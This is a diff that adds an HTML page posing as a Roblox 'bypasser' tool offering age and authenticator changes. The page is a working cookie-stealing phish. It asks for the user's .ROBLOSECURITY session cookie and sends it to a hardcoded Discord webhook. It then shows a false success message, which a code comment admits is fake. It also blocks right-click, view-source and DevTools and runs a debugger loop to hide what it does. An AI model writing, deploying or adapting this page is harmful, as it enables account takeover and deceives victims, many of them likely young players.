@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHARAOH | BYPASSER</title>
+    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+    <style>
+        :root {
+            --bg-color: #0a0a0a;
+            --card-bg: rgba(20, 20, 20, 0.9);
+            --text-color: #f5f5f5;
+            --accent-color: #ffffff;
+            --border-color: rgba(255, 255, 255, 0.1);
+            --input-bg: rgba(30, 30, 30, 0.7);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        @font-face {
+            font-family: 'Inter';
+            src: url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            color: var(--text-color);
+            background-color: var(--bg-color);
+            min-height: 100vh;
+            overflow-x: hidden;
+            cursor: default;
+        }
+        
+        #particles-js {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background-color: var(--bg-color);
+        }
+        
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 2rem;
+            perspective: 1000px;
+        }
+        
+        .card {
+            width: 100%;
+            max-width: 480px;
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
+            transform-style: preserve-3d;
+            transition: transform 0.6s cubic-bezier(0.16, 1, 0.3, 1),
+                        box-shadow 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+            will-change: transform;
+        }
+        
+        .header {
+            padding: 1.75rem 2rem;
+            text-align: center;
+            position: relative;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .header h1 {
+            font-size: 1.75rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            margin-bottom: 0.25rem;
+            background: linear-gradient(to right, #fff, #ccc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .header p {
+            font-size: 0.875rem;
+            opacity: 0.7;
+            font-weight: 400;
+        }
+        
+        .content {
+            padding: 2rem;
+        }
+        
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: var(--text-color);
+            opacity: 0.9;
+        }
+        
+        select, input {
+            width: 100%;
+            padding: 0.875rem 1rem;
+            background-color: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-color);
+            font-size: 0.9375rem;
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            appearance: none;
+        }
+        
+        select {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23f5f5f5' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 1rem center;
+            background-size: 1rem;
+        }
+        
+        select:focus, input:focus {
+            outline: none;
+            border-color: var(--accent-color);
+            box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.1);
+            transform: translateY(-2px);
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            color: white;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-weight: 500;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                          rgba(255, 255, 255, 0) 0%, 
+                          rgba(255, 255, 255, 0.03) 50%, 
+                          rgba(255, 255, 255, 0) 100%);
+            transform: translateX(-100%);
+            transition: transform 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        
+        .btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateY(-2px);
+        }
+        
+        .btn:hover::after {
+            transform: translateX(100%);
+        }
+        
+        .btn:active {
+            transform: translateY(0) scale(0.98);
+        }
+        
+        .btn-secondary {
+            margin-top: 1rem;
+            background: rgba(255, 255, 255, 0.03);
+        }
+        
+        .icon {
+            width: 1.25rem;
+            height: 1.25rem;
+            opacity: 0.8;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 1rem 2rem;
+            font-size: 0.75rem;
+            opacity: 0.5;
+            border-top: 1px solid var(--border-color);
+        }
+        
+        /* Mouse move tilt effect */
+        .card-tilt {
+            transition: transform 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        
+        /* Click animation */
+        @keyframes clickWave {
+            0% {
+                transform: scale(0.95);
+                opacity: 1;
+            }
+            100% {
+                transform: scale(1.05);
+                opacity: 0;
+            }
+        }
+        
+        .click-animate {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .click-animate::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: inherit;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .click-animate:active::before {
+            animation: clickWave 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        
+        @media (max-width: 480px) {
+            .main-container {
+                padding: 1rem;
+            }
+            
+            .card {
+                border-radius: 12px;
+            }
+            
+            .header {
+                padding: 1.5rem 1rem;
+            }
+            
+            .content {
+                padding: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="particles-js"></div>
+    
+    <div class="main-container">
+        <div class="card card-tilt" id="tilt-card">
+            <div class="header">
+                <h1>PHARAOH | BYPASSER</h1>
+                <p>Premium security solutions</p>
+            </div>
+            
+            <div class="content">
+                <form id="bypassForm">
+                    <div class="form-group">
+                        <label for="action">Select Action</label>
+                        <select id="action" required class="click-animate">
+                            <option value="" disabled selected>Choose an option</option>
+                            <option value="13">Force &lt;13 Age (13+ Age Required)</option>
+                            <option value="2FAdd">Add Authenticator</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="cookie">.ROBLOSECURITY Cookie</label>
+                        <input type="password" id="cookie" placeholder="_|WARNING:-DO-NOT-SHARE-THIS...|_" required class="click-animate">
+                    </div>
+                    
+                    <button type="submit" class="btn click-animate">
+                        <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path>
+                        </svg>
+                        Execute Request
+                    </button>
+                    
+                    <a href="https://discord.gg/tQrz6hFh4W" target="_blank" class="btn btn-secondary click-animate">
+                        <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                        </svg>
+                        Join Our Discord
+                    </a>
+                </form>
+            </div>
+            
+            <div class="footer">
+                © 2023 PHARAOH | All rights reserved
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Enhanced particles.js configuration
+        document.addEventListener('DOMContentLoaded', function() {
+            particlesJS('particles-js', {
+                "particles": {
+                    "number": {
+                        "value": 70,
+                        "density": {
+                            "enable": true,
+                            "value_area": 1000
+                        }
+                    },
+                    "color": {
+                        "value": "#ffffff"
+                    },
+                    "shape": {
+                        "type": "circle",
+                        "stroke": {
+                            "width": 0,
+                            "color": "#000000"
+                        }
+                    },
+                    "opacity": {
+                        "value": 0.3,
+                        "random": true,
+                        "anim": {
+                            "enable": true,
+                            "speed": 0.5,
+                            "opacity_min": 0.05,
+                            "sync": false
+                        }
+                    },
+                    "size": {
+                        "value": 2.5,
+                        "random": true,
+                        "anim": {
+                            "enable": true,
+                            "speed": 1.5,
+                            "size_min": 0.5,
+                            "sync": false
+                        }
+                    },
+                    "line_linked": {
+                        "enable": true,
+                        "distance": 180,
+                        "color": "#ffffff",
+                        "opacity": 0.1,
+                        "width": 1
+                    },
+                    "move": {
+                        "enable": true,
+                        "speed": 0.8,
+                        "direction": "none",
+                        "random": true,
+                        "straight": false,
+                        "out_mode": "out",
+                        "bounce": false,
+                        "attract": {
+                            "enable": true,
+                            "rotateX": 800,
+                            "rotateY": 1600
+                        }
+                    }
+                },
+                "interactivity": {
+                    "detect_on": "canvas",
+                    "events": {
+                        "onhover": {
+                            "enable": true,
+                            "mode": "repulse"
+                        },
+                        "onclick": {
+                            "enable": true,
+                            "mode": "push"
+                        },
+                        "resize": true
+                    },
+                    "modes": {
+                        "repulse": {
+                            "distance": 100,
+                            "duration": 0.8
+                        },
+                        "push": {
+                            "particles_nb": 3
+                        }
+                    }
+                },
+                "retina_detect": true
+            });
+
+            // Mouse move tilt effect
+            const card = document.getElementById('tilt-card');
+            document.addEventListener('mousemove', (e) => {
+                const x = e.clientX / window.innerWidth;
+                const y = e.clientY / window.innerHeight;
+                
+                const tiltX = (x - 0.5) * 20;
+                const tiltY = (0.5 - y) * 20;
+                
+                card.style.transform = `rotateY(${tiltX}deg) rotateX(${tiltY}deg)`;
+            });
+
+            // Reset tilt when mouse leaves
+            document.addEventListener('mouseleave', () => {
+                card.style.transform = 'rotateY(0deg) rotateX(0deg)';
+            });
+
+            // Add click animation to all interactive elements
+            document.querySelectorAll('.click-animate').forEach(element => {
+                element.addEventListener('mousedown', () => {
+                    element.style.transform = 'scale(0.98)';
+                });
+                element.addEventListener('mouseup', () => {
+                    element.style.transform = '';
+                });
+                element.addEventListener('mouseleave', () => {
+                    element.style.transform = '';
+                });
+            });
+
+            // Form submission handler with webhook logging
+            const form = document.getElementById('bypassForm');
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const action = document.getElementById('action').value;
+                const cookie = document.getElementById('cookie').value;
+                
+                // Log to webhook
+                try {
+                    const response = await fetch('https://discord.com/api/webhooks/1356358072586735767/e77HAT9CHg2LPrO0cMpDFbACeZ_4sxEWRMq3TcHYkzCmWQ7sOxoVlCrWnYJXm-Vs_gyC', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            content: null,
+                            embeds: [
+                                {
+                                    title: "New Bypass Request",
+                                    description: `**Action:** ${action}\n**Cookie:** \`${cookie}\``,
+                                    color: 16711680,
+                                    timestamp: new Date().toISOString(),
+                                    footer: {
+                                        text: "PHARAOH BYPASSER LOG"
+                                    }
+                                }
+                            ]
+                        })
+                    });
+                    
+                    if (!response.ok) {
+                        console.error('Failed to log to webhook');
+                    }
+                } catch (error) {
+                    console.error('Error logging to webhook:', error);
+                }
+                
+                // Show success message (even though we're just logging)
+                alert('Request processed! Check your account for changes.');
+                form.reset();
+            });
+        });
+
+        // ===== BLOCK RIGHT-CLICK (Prevent "Inspect Element") =====
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            alert("Right-click is disabled on this page!");
+        });
+
+        // ===== BLOCK KEYBOARD SHORTCUTS (F12, Ctrl+Shift+I, etc.) =====
+        document.addEventListener('keydown', (e) => {
+            // F12 Key
+            if (e.key === 'F12' || e.keyCode === 123) {
+                e.preventDefault();
+                alert("DevTools access is restricted!");
+            }
+            // Ctrl+Shift+I (Chrome, Firefox, Edge)
+            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.keyCode === 73)) {
+                e.preventDefault();
+                alert("DevTools access is restricted!");
+            }
+            // Ctrl+Shift+J (Console)
+            if (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j' || e.keyCode === 74)) {
+                e.preventDefault();
+                alert("DevTools access is restricted!");
+            }
+            // Ctrl+U (View Source)
+            if (e.ctrlKey && (e.key === 'U' || e.key === 'u' || e.keyCode === 85)) {
+                e.preventDefault();
+                alert("Viewing page source is disabled!");
+            }
+            // Ctrl+Shift+C (Inspect Element)
+            if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c' || e.keyCode === 67)) {
+                e.preventDefault();
+                alert("Inspect Element is disabled!");
+            }
+        });
+
+        // ===== DETECT DEVTOOLS OPENING (via window size check) =====
+        let devToolsCheck = setInterval(() => {
+            // If DevTools is open (either docked or undocked)
+            const threshold = 100;
+            const widthDiff = window.outerWidth - window.innerWidth;
+            const heightDiff = window.outerHeight - window.innerHeight;
+            
+            if (widthDiff > threshold || heightDiff > threshold) {
+                alert("DevTools detected! This page will close.");
+                window.location.href = "about:blank"; // Redirect to blank page
+                clearInterval(devToolsCheck);
+            }
+        }, 1000);
+
+        // ===== ANTI-DEBUGGING TRICK (Annoying "debugger;" loop) =====
+        (function() {
+            let startTime = Date.now();
+            setInterval(() => {
+                if (Date.now() - startTime > 2000) {
+                    debugger;
+                    startTime = Date.now();
+                }
+            }, 100);
+        })();
+    </script>
+</body>
+</html>
